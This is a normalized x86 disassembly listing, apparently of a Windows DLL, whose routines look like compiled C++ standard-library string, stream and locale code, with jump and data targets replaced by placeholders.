push 0x0
push edi
call sub_10027b60
add esp 0xc
test eax eax
je r-xdata
sub_10005f27
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ esp + 0x8 ]
call sub_10007f6a
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax esi
pop esi
retn 0x4
sub_10005f98
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_1000212d
test al al
je r-xdata
call sub_10021cc4
pop edi
mov eax esi
pop esi
retn 0x8
push [ esp + 0x10 ]
mov ecx esi
push edi
push 0x0
call sub_1000161f
push edi
mov ecx esi
call sub_100021a7
sub_10005fd5
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_100070ba
add esp 0xc
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
sub_10006020
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_10007b16
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_10006047
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_10007b4d
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov ax [ esi + 0x6 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_10006075
push ebp
mov ebp esp
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0x7
call sub_10002630
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push esi
call sub_10006b28
mov eax esi
pop ebp
retn 0x10
sub_100060a3
push 0x1c
mov eax sub_10052089
call sub_1002b2d9
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x14 ]
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x18 ]
xor edi edi
cmp eax edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x20 ] ecx
jle r-xdata
mov [ ebp - 0x1c ] edi
cmp eax ecx
jbe r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
sub eax ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x1c ] edi
jbe r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x18 ] edi
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_10007e90
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0xc ]
mov edi [ eax + esi + 0x28 ]
push ebx
call sub_10007092
movzx eax [ eax ]
push eax
mov ecx edi
call sub_10007f6a
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp [ ebp - 0x18 ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007f6a
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_10007f1c
mov eax esi
call sub_1002b37e
retn
push edi
push [ ebp - 0x18 ]
call sub_100081bf
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov [ eax + 0x18 ] edi
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x1c ] edi
jbe r-xdata
inc ebx
xor edi edi
jmp r-xdata
or [ ebp - 0x18 ] 0x4
xor edi edi
dec [ ebp - 0x1c ]
jmp r-xdata
or [ ebp - 0x18 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007f6a
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jae r-xdata
dec [ ebp - 0x1c ]
jmp r-xdata
or [ ebp - 0x18 ] 0x4
sub_100061f9
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100080a5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000622b
push 0x24
mov eax sub_10052064
call sub_1002b2d9
mov edi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x30 ]
xor ebx ebx
push eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x15 ] bl
call sub_10007d03
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x2c ] bl
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov [ eax + 0x18 ] ebx
cmp [ ebp - 0x15 ] bl
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10007a4d
pop ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x4 ] bl
call sub_10007dbd
mov ecx [ ebp + 0xc ]
push 0xffffffff
push ebx
call sub_100022bb
mov [ ebp - 0x4 ] 0x2
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x18 ]
cmp ecx ebx
jle r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x1c ] ebx
je r-xdata
or [ ebp - 0x1c ] 0x2
mov [ ebp - 0x20 ] 0x7ffffffe
mov [ ebp - 0x20 ] ecx
cmp ecx 0x7ffffffe
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
cmp eax ebx
je r-xdata
push ebx
push [ ebp - 0x1c ]
call sub_100081bf
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax 0xffff
cmp ax si
jne r-xdata
mov ecx [ eax + 0x28 ]
call sub_10007b4d
mov eax edi
call sub_1002b37e
retn
lea ecx [ eax + 0x4 ]
call sub_10021d73
mov ecx [ ebp - 0x28 ]
mov eax [ ecx ]
push esi
push 0x48
call [ eax + 0x8 ]
cmp al bl
jne r-xdata
or [ ebp - 0x1c ] 0x1
mov ecx [ ebp + 0xc ]
push esi
push 0x1
call sub_10005db8
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov esi [ eax + edi + 0x28 ]
dec [ ebp - 0x20 ]
mov [ ebp - 0x15 ] 0x1
call sub_10007b71
jmp r-xdata
movzx eax ax
movzx esi ax
cmp [ ebp - 0x20 ] ebx
jbe r-xdata
sub_10006307
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_100080a5
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_10006383
push ebp
mov ebp esp
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_100021a7
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push esi
call sub_10006bb5
mov eax esi
pop ebp
retn 0x10
sub_100063b1
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10006762
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1000644e
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10006801
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_100064eb
push ebx
push esi
mov ebx eax
mov eax [ esp + 0xc ]
push edi
mov edi ecx
sub eax edi
push 0x1c
cdq
pop ecx
idiv ecx
mov esi eax
imul esi esi 0x1c
add esi ebx
cmp edi [ esp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn
sub ebx edi
push 0xffffffff
push 0x0
push edi
lea ecx [ ebx + edi ]
call sub_1000253c
add edi 0x1c
cmp edi [ esp + 0x10 ]
jne r-xdata
sub_10006529
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10006dd4
add esp 0x10
pop edi
leave
retn 0x8
sub_1000654d
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100068da
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_100065ea
push 0x38
mov eax sub_1004eb37
call sub_1002b30f
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
xor edx edx
mov [ ebp - 0x44 ] eax
test cx cx
je r-xdata
push 0x0
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
call sub_10005cd0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x40 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
movzx eax cx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp - 0x40 ]
call sub_1002b392
retn
movzx eax [ esi + edi * 2 ]
test ax ax
je r-xdata
inc edx
movzx eax [ esi + edx * 2 ]
test ax ax
jne r-xdata
inc [ ebp + 0x10 ]
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
movzx ecx [ esi ]
cmp ax cx
jne r-xdata
add edi [ ebp - 0x38 ]
movzx eax [ esi + edi * 2 ]
cmp ax [ esi ]
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
movsx eax [ eax ]
add edi eax
jmp r-xdata
inc edi
movzx eax [ esi + edi * 2 ]
test ax ax
jne r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
test ax ax
je r-xdata
inc [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ax cx
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov [ eax ] bl
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x40 ] eax
mov ebx [ ebp - 0x38 ]
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_100068a0
test al al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
mov ecx [ ebp - 0x3c ]
call sub_10005f4d
cmp [ esi + edi * 2 ] ax
jne r-xdata
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_100068a0
test al al
jne r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov [ eax ] bl
jmp r-xdata
mov ebx [ ebp - 0x38 ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
call sub_10006020
or [ ebp - 0x40 ] 0xffffffff
jmp r-xdata
xor edi edi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x34 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
sub_10006762
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1000697d
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10006801
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1000699e
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_100068a0
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ esp + 0x10 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_10006047
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_10006047
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_100068da
push 0x98
mov eax sub_10050270
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_1002b37e
retn
cmp [ eax ] edi
jne r-xdata
push 0x18
call sub_1002738b
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_1000792f
mov [ ebp - 0x4 ] bl
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x10 ] ebx
call sub_100078da
push ebx
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x10 ] esi
call sub_100069bf
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000794c
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
test [ ebp - 0x10 ] 0x2
mov [ ecx ] eax
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_100020e2
sub_100069bf
push 0x4
mov eax sub_1004ee15
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_100069f5
mov eax esi
call sub_1002b37e
retn 0xc
sub_100069f5
push 0x14
mov eax sub_1004fa51
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10027b31
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10022358
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ edi + 0x8 ]
call sub_10006c37
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_10022358
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
mov [ ebp - 0x1c ] edx
call sub_10006f91
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_10022358
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
mov [ ebp - 0x1c ] edx
call sub_10006f91
or [ ebp - 0x4 ] 0xffffffff
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_10022358
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_10007340
mov [ esi + 0xc ] ax
call sub_10022358
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_10007340
add esp 0x18
mov [ esi + 0xe ] ax
cmp [ ebp + 0xc ] bl
je r-xdata
call sub_1002b37e
retn 0x8
call sub_10022358
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
call sub_10006c37
mov [ esi + 0x8 ] eax
call sub_10022358
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2e
mov [ ebp - 0x1c ] edx
call sub_10007340
mov [ esi + 0xc ] ax
call sub_10022358
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push 0x2c
mov [ ebp - 0x14 ] edx
call sub_10007340
add esp 0x24
mov [ esi + 0xe ] ax
sub_10006b28
push 0x14
mov eax sub_10050540
call sub_1002b2d9
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_10006f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10006c8d
and [ ebp - 0x4 ] 0x0
call sub_1002b37e
retn 0x18
lea ecx [ ebp + 0x10 ]
call sub_10006ccf
movsx ax [ eax ]
mov ecx [ ebp + 0x8 ]
movzx eax ax
push eax
push 0x1
call sub_10005db8
lea ecx [ ebp + 0x10 ]
call sub_10006d06
jmp r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10006d7a
test al al
jne r-xdata
sub_10006bb5
push 0xc
mov eax sub_1004fcdf
call sub_1002b2d9
push [ ebp + 0x1c ]
xor edi edi
push [ ebp + 0x18 ]
lea esi [ ebp - 0x14 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] edi
push [ ebp + 0x10 ]
call sub_10006da6
mov ecx [ ebp + 0x8 ]
add esp 0x10
push [ ebp - 0x14 ]
call sub_10006c60
mov [ ebp - 0x4 ] edi
call sub_1002b37e
retn 0x18
lea ecx [ ebp + 0x10 ]
call sub_10006f37
movzx eax [ eax ]
mov ecx [ ebp + 0x8 ]
push eax
push 0x1
call sub_100014aa
lea ecx [ ebp + 0x10 ]
call sub_10006d3f
jmp r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10006d7a
test al al
jne r-xdata
sub_10006c37
push esi
push edi
mov edi [ esp + 0xc ]
push edi
call sub_10027160
mov esi eax
inc esi
push esi
call sub_10022df7
pop ecx
pop ecx
mov ecx eax
jmp r-xdata
test esi esi
ja r-xdata
mov dl [ edi ]
dec esi
mov [ ecx ] dl
inc ecx
inc edi
pop edi
pop esi
retn
sub_10006c60
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x14 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x18 ] eax
je r-xdata
push 0x1
push eax
call sub_1000212d
test al al
je r-xdata
push edi
mov ecx esi
call sub_100021a7
sub_10006c8d
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x14 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x18 ] eax
je r-xdata
push 0x1
push eax
call sub_100024cd
test al al
je r-xdata
push edi
mov ecx esi
call sub_10002630
sub_10006ccf
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_10027827
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10027827
mov eax [ eax + 0x14 ]
add eax ecx
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10006d06
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
inc [ esi + 0x4 ]
mov eax esi
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_10027827
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10027827
mov eax [ eax + 0x14 ]
add eax ecx
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10006d3f
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
add [ esi + 0x4 ] 0x2
mov eax esi
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10027827
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10027827
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10006d7a
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
neg eax
sbb eax eax
inc eax
pop esi
retn 0x4
test eax eax
je r-xdata
call sub_10027827
cmp eax [ edi ]
je r-xdata
sub_10006da6
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_10006ee7
add [ esi ] eax
leave
retn
sub_10006dd4
push 0x8
mov eax sub_10050a2a
call sub_1002b2d9
mov esi ecx
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
call sub_1002b37e
retn
mov ecx [ ebp + 0xc ]
push esi
call sub_10001b56
add [ ebp + 0xc ] 0x1c
pop ecx
add esi 0x1c
jmp r-xdata
cmp esi [ ebp + 0x8 ]
je r-xdata
sub_10006e04
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0xc ]
jne r-xdata
push 0x1
mov ecx esi
call sub_1000264e
add esi 0x1c
push 0x0
call sub_1002ae74
mov eax [ ebp + 0xc ]
call sub_1002b37e
retn
sub_10006e2c
cmp [ eax + 0x18 ] 0x8
mov edx [ eax + 0x14 ]
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push edx
push eax
push [ ecx + 0x14 ]
push 0x0
call sub_10006e80
neg eax
sbb eax eax
inc eax
retn
sub_10006e4f
cmp [ esp + 0xc ] 0x0
jbe r-xdata
xor eax eax
retn
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
retn
inc eax
inc eax
inc ecx
inc ecx
dec [ esp + 0xc ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_10006e80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
sub eax edi
cmp eax ebx
jae r-xdata
call sub_10021cfc
mov eax [ ebp + 0x14 ]
cmp ebx eax
jae r-xdata
mov ebx eax
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax ebx
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push eax
push [ ebp + 0x10 ]
lea eax [ esi + edi * 2 ]
push eax
call sub_10006e4f
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
cmp ebx [ ebp + 0x14 ]
setne al
or eax 0xffffffff
jmp r-xdata
sub_10006ee7
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
sar eax 0x1
pop esi
retn 0x4
test eax eax
je r-xdata
call sub_10027827
cmp eax [ edi ]
je r-xdata
sub_10006f10
push esi
mov esi ecx
mov eax [ esi ]
push edi
